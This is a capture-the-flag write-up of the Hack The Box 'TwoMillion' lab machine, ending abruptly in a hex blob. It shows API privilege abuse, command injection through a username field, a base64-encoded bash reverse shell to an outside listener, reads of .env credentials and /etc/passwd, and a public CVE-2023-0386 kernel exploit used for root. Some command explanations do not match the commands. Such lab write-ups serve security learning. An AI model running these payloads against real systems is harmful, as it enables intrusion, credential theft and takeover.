


Hola! Today lets deep dive into another adventure called "[TwoMillion](https://app.hackthebox.com/machines/TwoMillion)"

![[Pasted image 20240920153122.png]]

Fire up the initial  Nmap Scan

```bash
nmap -sV -sV <machine ip>
```

Then we got the following scan results

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/twomillion]
└─$ nmap -sV -sC 10.10.11.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-20 15:28 IST
Nmap scan report for 10.10.11.221
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.04 seconds
```

Lets check the following `http` service running on port `80`

Note: But before accessing the site you need to add the ip address and domain to `2million.htb` to your local dns file `/etc/hosts`

![[Pasted image 20240920153846.png]]

Upon adding the vhost to the local dns file, we can visit the browser page and see that its an old HackTheBox website.

![[Pasted image 20240920222016.png]]

Upon investigating the page by going through it, you are redirected `/invite` when clicked on `join htb`. It has functionality to login.

This old login page of HackThebox comprised of many guides on how to hack this page in online. For now lets move further and review source code



![[Pasted image 20240920224637.png]]


The second function appears to be invoked upon pressing the submit button, transmitting a POST request to `/api/v1/invite/verify` to determine the validity of the submitted code. A script named `inviteapi.min.js` is also being loaded. Let us examine its functionality.

```html
 <!-- scripts -->
    <script src="/js/htb-frontend.min.js"></script>
    <script defer src="/js/inviteapi.min.js"></script>
    <script defer>
        $(document).ready(function() {
            $('#verifyForm').submit(function(e) {
                e.preventDefault();

                var code = $('#code').val();
                var formData = { "code": code };

                $.ajax({
                    type: "POST",
                    dataType: "json",
                    data: formData,
                    url: '/api/v1/invite/verify',
                    success: function(response) {
                        if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                            // Store the invite code in localStorage
                            localStorage.setItem('inviteCode', code);

                            window.location.href = '/register';
                        } else {
                            alert("Invalid invite code. Please try again.");
                        }
                    },
                    error: function(response) {
                        alert("An error occurred. Please try again.");
                    }
                });
            });
        });
    </script>
</body>
</html>
```

Upon going to the `inviteapi.min.js` we can see the following java code which is obfuscated

```javascript
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST |formData|ajax|type|url|success|api/v1|invite|error|data|var |verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

So, I utilized `de4js` to deobfuscate the code, after deobfuscation I got the following code

```javascript
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```


This code snippet performs two different operations. To validate an invitation code, the first one is very much like the one we saw on the invitation page previously. Somewhat more intriguing is the second one, which has the capability to perform a `POST` request to `/api/v1/invite/how/to/generate`. We can use `CURL` or this JavaScript method in our browser's console to reach this endpoint, which is really intriguing. The latter is the one we'll choose.

```bash
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
```

The command breakdown is as follows

- `curl`: A command-line tool used to send HTTP requests to a server.
- `-s`: Silent mode, which suppresses progress output and errors from `curl`.
- `-X POST`: Specifies the HTTP method as `POST`. This tells `curl` to make a POST request to the given URL (instead of the default GET request).
- `http://2million.htb/api/v1/invite/how/to/generate`: This is the URL of the API endpoint you're interacting with.
- `jq`: A command-line utility for parsing and formatting JSON data. In this case, `jq` will take the JSON response from the `curl` request and format it in a more readable way.

![[Pasted image 20240920230242.png]]


The result appears to be encrypted data in JSON format and includes some interesting details. It is hinted that the encryption type is ROT13, which is simply a Caesars cipher. Additionally, there is a hint that demands our attention, stating that we must determine the sort of encryption and decipher it. To decipher the data shown above, one can visit the website rot13.  
This is the message that appears after we paste the encrypted data into the website:

```ROT13
"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr"
```

This is the message that appears after we paste the encrypted data into the website:

```Text
In order to generate the invite code, make a POST request to /api/v1/invite/generate"
```

According to the message, we can send a POST request to /api/v1/invite/generate in order to obtain an invite code. Let's follow the previous example.

```bash
curl -sX POST http://2million.htb/api/v1/invite/generate | jq
```

The command breakdown is as follows
- `curl`: A command-line tool to transfer data using various network protocols.
- `-s`: Silent mode, suppresses progress output and errors.
- `-X POST`: This specifies that the request should be a **POST** request.
- `http://2million.htb/api/v1/invite/generate`: The URL for the API endpoint to generate an invite.
- `jq` parses JSON data, formatting the response into a readable structure.

![[Pasted image 20240920231837.png]]

We got another encoded string and it resembles Base64 and decoding it I got an invite code

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/twomillion]
└─$ echo MkRSVk4tNVhOSEMtTzJNUDAtQlg2Rk8= | base64 -d
2DRVN-5XNHC-O2MP0-BX6FO
```

Let's check whether its valid or invalid by submitting it at the `/invite` page.

Once validated the code fill up the details

![[Pasted image 20240920233151.png]]

Then login to the site using same credentials and we got successful login and redirected to `/home`

![[Pasted image 20240920233316.png]]

The website being old features only few pages and the one that picks interst is `access` page

![[Pasted image 20240920234356.png]]

A user can access the HTB infrastructure by downloading and regenerating their VPN file on the Access page. To find out what the Connection Pack download button does, let's launch BurpSuite.

![[Pasted image 20240920234710.png]]

In response to the button click, the current user's VPN file is downloaded via a `GET` request to `/api/v1/users/vpn/generate`.We can see if anything interesting is returned by trying to request the URL `/api`.

```bash
curl -v 2million.htb/api
```

The breakdown of code is as follows
- **`curl`**: The command-line tool used for transferring data with URLs.
- **`-v`**: This stands for **verbose mode**. It outputs detailed information about the request and response, including headers, status codes, and even details about the connection.

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/twomillion]
└─$ curl -v 2million.htb/api
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.221
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
> GET /api HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.8.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 401 Unauthorized
< Server: nginx
< Date: Fri, 20 Sep 2024 18:21:22 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: PHPSESSID=k4g6md4oahoieht93a5t061ipt; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact
```

It appears that we are receiving a status code of `401 Unauthorized`. We should attempt to provide the website with our PHP session cookie, which can be obtained from either our browser dev tools or BurpSuite, as previously demonstrated.

```bash
curl -sv 2million.htb/api --cookie "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v" | jq
```
The breakdown of command is as follows

- **`-s`**: Silent mode, which suppresses progress bar output, but combined with `-v`, it allows for verbose output of the request/response headers.
- **`-v`**: Verbose mode, which provides detailed information about the HTTP request/response (including headers and status codes).
- **`2million.htb/api`**: The URL where the request is being sent.
- **`--cookie "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v"`**: Sends a cookie (typically used for session authentication). Here, it's sending a session cookie named `PHPSESSID` with the value `tqpkbmki0huistvsqsv7sqck4v`. This is likely required to maintain an authenticated session or access restricted content.
- **`| jq`**: The output from `curl` is piped to `jq`, which is a command-line JSON processor. It formats and processes JSON data for easier readability or further manipulation

![[Pasted image 20240920235519.png]]

Now let's request `/api/v1` to see if any endpoints are listed.

```bash
curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v" | jq
```
The breakdown of command is as follows

- **`-s`**: Silent mode, which suppresses progress bar output, but combined with `-v`, it allows for verbose output of the request/response headers.
- **`-v`**: Verbose mode, which provides detailed information about the HTTP request/response (including headers and status codes).
- **`2million.htb/api/v1`**: The URL where the request is being sent.
- **`--cookie "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v"`**: Sends a cookie (typically used for session authentication). Here, it's sending a session cookie named `PHPSESSID` with the value `tqpkbmki0huistvsqsv7sqck4v`. This is likely required to maintain an authenticated session or access restricted content.
- **`| jq`**: The output from `curl` is piped to `jq`, which is a command-line JSON processor. It formats and processes JSON data for easier readability or further manipulation.

![[Pasted image 20240921000246.png]]

The API provides a list of numerous endpoints, including the admin-specific endpoints, which are among the most intriguing. To determine whether we are an administrator user, we can access the `/admin/auth` endpoint as a test.

```bash
curl -sv 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v" | jq
```
The breakdown of command is as follows

- **`-s`**: Silent mode, which suppresses progress bar output, but combined with `-v`, it allows for verbose output of the request/response headers.
- **`-v`**: Verbose mode, which provides detailed information about the HTTP request/response (including headers and status codes).
- **`2million.htb/api/v1/admin/auth`**: The URL where the request is being sent.
- **`--cookie "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v"`**: Sends a cookie (typically used for session authentication). Here, it's sending a session cookie named `PHPSESSID` with the value `tqpkbmki0huistvsqsv7sqck4v`. This is likely required to maintain an authenticated session or access restricted content.
- **`| jq`**: The output from `curl` is piped to `jq`, which is a command-line JSON processor. It formats and processes JSON data for easier readability or further manipulation.

We are not presently an administrative user, as anticipated.

![[Pasted image 20240921000543.png]]


 To investigate the /admin/vpn/generate endpoint, we will modify our request to POST and re-include our cookie.

```bash
curl -sv -X POST 2million.htb/api/v1 --cookie   "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v" | jq
```

The breakdown of command is as follows

- **`-s`**: Silent mode, which suppresses progress bar output, but combined with `-v`, it allows for verbose output of the request/response headers.
- **`-v`**: Verbose mode, which provides detailed information about the HTTP request/response (including headers and status codes).
- **`-X POST`**: Specifies the HTTP method as `POST`. Without specifying `-X`, `curl` defaults to `GET`, but in this case, it's explicitly sending a `POST` request.
- **`2million.htb/api/v1/admin/vpn/generate`**: The URL where the request is being sent.
- **`--cookie "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v"`**: Sends a cookie (typically used for session authentication). Here, it's sending a session cookie named `PHPSESSID` with the value `tqpkbmki0huistvsqsv7sqck4v`. This is likely required to maintain an authenticated session or access restricted content.
- **`| jq`**: The output from `curl` is piped to `jq`, which is a command-line JSON processor. It formats and processes JSON data for easier readability or further manipulation.

![[Pasted image 20240921001003.png]]


We receive a 401 Unauthorized error, which is likely due to the fact that we are not an administrator. We will proceed to the final administrative endpoint, `/admin/settings/update`.We note that this request needs to be a `PUT` as shown  in the output from `/api/v1` .

```bash
curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie   "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v" | jq
```

The breakdown of command is as follows

- **`-s`**: Silent mode, which suppresses progress bar output, but combined with `-v`, it allows for verbose output of the request/response headers.
- **`-v`**: Verbose mode, which provides detailed information about the HTTP request/response (including headers and status codes).
- **`-X POST`**: Specifies the HTTP method as `POST`. Without specifying `-X`, `curl` defaults to `GET`, but in this case, it's explicitly sending a `POST` request.
- **`2million.htb/api/v1/admin/settings/update`**: The URL where the request is being sent.
- **`--cookie "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v"`**: Sends a cookie (typically used for session authentication). Here, it's sending a session cookie named `PHPSESSID` with the value `tqpkbmki0huistvsqsv7sqck4v`. This is likely required to maintain an authenticated session or access restricted content.
- **`| jq`**: The output from `curl` is piped to `jq`, which is a command-line JSON processor. It formats and processes JSON data for easier readability or further manipulation.

![[Pasted image 20240921001604.png]]

It's interesting that this time the API doesn't give us an Unauthorized error. Instead, it gives us an Invalid content type error. A lot of the time, APIs send and receive data in JSON. We already know that the API answers in JSON, so let's change the Content-Type header to JSON and try again.

```bash
curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie   "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v" --header "Content-Type: application/json" | jq
```

The breakdown of command is as follows

- **`-s`**: Silent mode, which suppresses progress bar output, but combined with `-v`, it allows for verbose output of the request/response headers.
- **`-v`**: Verbose mode, which provides detailed information about the HTTP request/response (including headers and status codes).
- **`-X POST`**: Specifies the HTTP method as `POST`. Without specifying `-X`, `curl` defaults to `GET`, but in this case, it's explicitly sending a `POST` request.
- **`2million.htb/api/v1/admin/settings/update`**: The URL where the request is being sent.
- **`--cookie "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v"`**: Sends a cookie (typically used for session authentication). Here, it's sending a session cookie named `PHPSESSID` with the value `tqpkbmki0huistvsqsv7sqck4v`. This is likely required to maintain an authenticated session or access restricted content.
- **`--header "Content-Type: application/json"`**: Sets the content type of the request body to `application/json`, informing the server that the data being sent is in JSON format. This is important for APIs that expect JSON input.
- **`| jq`**: The output from `curl` is piped to `jq`, which is a command-line JSON processor. It formats and processes JSON data for easier readability or further manipulation.

We get the following error
```bash
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```


```bash
curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie   "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v" --header "Content-Type: application/json" --data '{"email":"dkvv@2mil.htb"}' | jq
```

The breakdown of command is as follows

- **`-s`**: Silent mode, which suppresses progress bar output, but combined with `-v`, it allows for verbose output of the request/response headers.
- **`-v`**: Verbose mode, which provides detailed information about the HTTP request/response (including headers and status codes).
- **`-X POST`**: Specifies the HTTP method as `POST`. Without specifying `-X`, `curl` defaults to `GET`, but in this case, it's explicitly sending a `POST` request.
- **`2million.htb/api/v1/admin/settings/update`**: The URL where the request is being sent.
- **`--cookie "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v"`**: Sends a cookie (typically used for session authentication). Here, it's sending a session cookie named `PHPSESSID` with the value `tqpkbmki0huistvsqsv7sqck4v`. This is likely required to maintain an authenticated session or access restricted content.
- **`--header "Content-Type: application/json"`**: Sets the content type of the request body to `application/json`, informing the server that the data being sent is in JSON format. This is important for APIs that expect JSON input.
- **`--data '{"email":"dkvv@2mil.htb"}'`**: The actual data payload being sent in JSON format. It contains an email field with the value `dkvv@2mil.htb"`. This is the information being updated in the admin settings.
- **`| jq`**: The output from `curl` is piped to `jq`, which is a command-line JSON processor. It formats and processes JSON data for easier readability or further manipulation.
  
  Then I got the following error
  
```bash
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

Modifying the command with missing paramter

```bash
curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie   "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v" --header "Content-Type: application/json" --data '{"email":"dkvv@2mil.htb", "is_admin": true}' | jq
```

The breakdown of command is as follows

- **`-s`**: Silent mode, which suppresses progress bar output, but combined with `-v`, it allows for verbose output of the request/response headers.
- **`-v`**: Verbose mode, which provides detailed information about the HTTP request/response (including headers and status codes).
- **`-X POST`**: Specifies the HTTP method as `POST`. Without specifying `-X`, `curl` defaults to `GET`, but in this case, it's explicitly sending a `POST` request.
- **`2million.htb/api/v1/admin/settings/update`**: The URL where the request is being sent.
- **`--cookie "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v"`**: Sends a cookie (typically used for session authentication). Here, it's sending a session cookie named `PHPSESSID` with the value `tqpkbmki0huistvsqsv7sqck4v`. This is likely required to maintain an authenticated session or access restricted content.
- **`--header "Content-Type: application/json"`**: Sets the content type of the request body to `application/json`, informing the server that the data being sent is in JSON format. This is important for APIs that expect JSON input.
- **`--data '{"email":"dkvv@2mil.htb"}'`**: The actual data payload being sent in JSON format. It contains an email field with the value `dkvv@2mil.htb"`. This is the information being updated in the admin settings.
- `"is_admin": true`: Sets the `is_admin` flag to `true`, likely giving the user admin privileges.
- **`| jq`**: The output from `curl` is piped to `jq`, which is a command-line JSON processor. It formats and processes JSON data for easier readability or further manipulation.

```bash
{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```

Still I got an error since we set the option to true, which means that this variable needs to have a value of either 0 or 1. So, let's set it to 1.

```bash
curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie   "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v" --header "Content-Type: application/json" --data '{"email":"dkvv@2mil.htb", "is_admin": '1'}' | jq
```

Now, our user is an `admin`

```bash
{
  "id": 23,
  "username": "dkvv",
  "is_admin": 1
}
```

The above statement seems to have worked because it gave us back our user information and set the `is_admin` variable to 1. We can be even more sure of this by going to the `/admin/auth` endpoint we saw earlier.

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/twomillion]
└─$ curl -sv 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v" | jq
{
  "message": true
}
```

This time we got the value as `true` instead of error meaning we got admin privileges.

Now that we have enough privileges, let's look at the `/admin/vpn/generate` URL.

```bash
curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie   "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v" --header "Content-Type: application/json" | jq
```

We got an output with error

![[Pasted image 20240921004150.png]]

The output tells us that a parameter called username is missing. We can assume that this is the username of the person for whom the VPN will be made, so let's try entering our random username which we entered at time of account creation.


```bash
curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie   "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v" --header "Content-Type: application/json" --data '{"username":"dkvv"}'
```

This command created a VPN setup file for my user account "dkvv", and it was printed to us. If the exec or system PHP function is used to create the VPN and there isn't enough screening in place (which is possible since this is an administrative-only function), it might be possible to put malicious code in the username field and run commands on the remote system.

To test this idea, let's add the command ;id; after the username.

```bash
curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie   "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v" --header "Content-Type: application/json" --data '{"username":"dkvv;id;"}'
```

Then we get the following output

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The command is successful and we gain command execution. Let's start a Netcat listener to catch a shell.

```bash
nc -lvnp 5555
```

After that, we can get a shell with the command below.

```bash
bash -i >& /dev/tcp/10.10.14.86/5555 0>&1
```

We encode the payload in Base64 and append it to the  above command. The command with payload will be

```bash
curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie   "PHPSESSID=tqpkbmki0huistvsqsv7sqck4v" --header "Content-Type: application/json" --data '{"username":"dkvv;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44Ni81NTU1IDA+JjE= | base64 -d | bash;"}'
```

![[Pasted image 20240921005914.png]]

We got the reverse shell. After enumerating the web directory it revealed a file called `.env` which contains the database credentials for an admin user.

```bash
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Then I checked the `/etc/passwd` file to verify an user named admin and he exists.

```bash
www-data@2million:~/html$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
<snip>
admin:x:1000:1000::/home/admin:/bin/bash
memcache:x:115:121:Memcached,,,:/nonexistent:/bin/false
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Now we can connect to the opened `ssh` port using the username `admin` and password `SuperDuperPass123`

![[Pasted image 20240921010646.png]]

In the same directory, I found the user flag
![[Pasted image 20240921010935.png]]


### Privilege escalation

If we look through the present user's emails in `/var/mail`, we find a file called admin that has all of their emails. Let's read it.

![[Pasted image 20240921011237.png]]

The email comes from ch4p and tells the admin that he needs to update this system because there have been some major kernel exploits lately. It talks about an attack for OverlayFS/FUSE in particular.

Performing a quick google search using the keywords `overlays fuse exploit`. The search results show this story about a flaw in the Linux kernel that has been given the number [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386). After doing further research, this [article](https://ubuntu.com/security/CVE-2023-0386) from Ubuntu lists out the versions affected with this exploit.

Enumerating the Kernel we found out the version utilized by the box is `5.15.70`

```bash
admin@2million:/$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

We can also see that box current release version is `jammy.`
```bash
admin@2million:/$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 22.04.2 LTS
Release:	22.04
Codename:	jammy
```

The jammy kernel versions that are vulnerable go up to 5.15.0-70.77. The box is using 5.15.70, so it would be smart to check to see if it is susceptible. There are many attacks online, and this one on GitHub [repo](https://github.com/xkaneiki/CVE-2023-0386) is one of them.

Download the exploit locally by cloning the repository.

```bash
git clone https://github.com/xkaneiki/CVE-2023-0386
```

Compress the entire repository so that it is easier to upload.

Then upload it using `scp` to the `/tmp` folder

![[Pasted image 20240921012717.png]]

On the box, navigate to /tmp and unzip the contents of cve.zip .

```bash
cd /tmp
unzip cve.zip
```

As per the instructions on the GitHub page, enter the `CVE-2023-0386` directory and compile the code
Note: The compilation throws a few warnings but these can be safely ignored.

```bash
CVE-2023-0386
cve.zip
looney-tunables-CVE-2023-4911
snap-private-tmp
systemd-private-aa1d272811ea47128a841f01b4646296-memcached.service-4n8p5I
systemd-private-aa1d272811ea47128a841f01b4646296-ModemManager.service-62E7n4
systemd-private-aa1d272811ea47128a841f01b4646296-systemd-logind.service-Yu4GMi
systemd-private-aa1d272811ea47128a841f01b4646296-systemd-resolved.service-ctu0PA
systemd-private-aa1d272811ea47128a841f01b4646296-systemd-timesyncd.service-q848L8
systemd-private-aa1d272811ea47128a841f01b4646296-upower.service-5XJjRl
vmware-root_610-2731152165
admin@2million:/tmp$ cd CVE-2023-0386/
admin@2million:/tmp/CVE-2023-0386$ make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
fuse.c: In function ‘read_buf_callback’:
fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
  106 |     printf("offset %d\n", off);
      |                    ~^     ~~~
      |                     |     |
      |                     int   off_t {aka long int}
      |                    %ld
fuse.c:107:19: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘size_t’ {aka ‘long unsigned int’} [-Wformat=]
  107 |     printf("size %d\n", size);
      |                  ~^     ~~~~
      |                   |     |
      |                   int   size_t {aka long unsigned int}
      |                  %ld
fuse.c: In function ‘main’:
fuse.c:214:12: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
  214 |     while (read(fd, content + clen, 1) > 0)
      |            ^~~~
      |            fread
fuse.c:216:5: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
  216 |     close(fd);
      |     ^~~~~
      |     pclose
fuse.c:221:5: warning: implicit declaration of function ‘rmdir’ [-Wimplicit-function-declaration]
  221 |     rmdir(mount_path);
      |     ^~~~~
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
gcc -o exp exp.c -lcap
gcc -o gc getshell.c

```

Finally, let's run the exploit in two steps. We run the first command in one terminal in background.
```bash
./fuse ./ovlcap/lower ./gc &
```

Then open another terminal and connect to `ssh` and run the following command to commence attack.
```bash
./exp
```

![[Pasted image 20240921013854.png]]

Then as you can see we successfully got the root privelages

![[Pasted image 20240921014108.png]]

Then submit the flag and the machine is done! See you on next adventure. I gave the flags at bottom of the page.

![[Pasted image 20240921014751.png]]

### Post Escalation
There is also another file called `thank_you.json` along with root flag lets try see what it holds

```bash
root@2million:/root# cat thank_you.json 
{"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}
```

As the the program depicts it is `url` encoded. Let's use [cyberchef](https://gchq.github.io/CyberChef/) to decode it.After doing so we get the following hex encoded

```text
"{"encoding": "hex", "data": "7b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773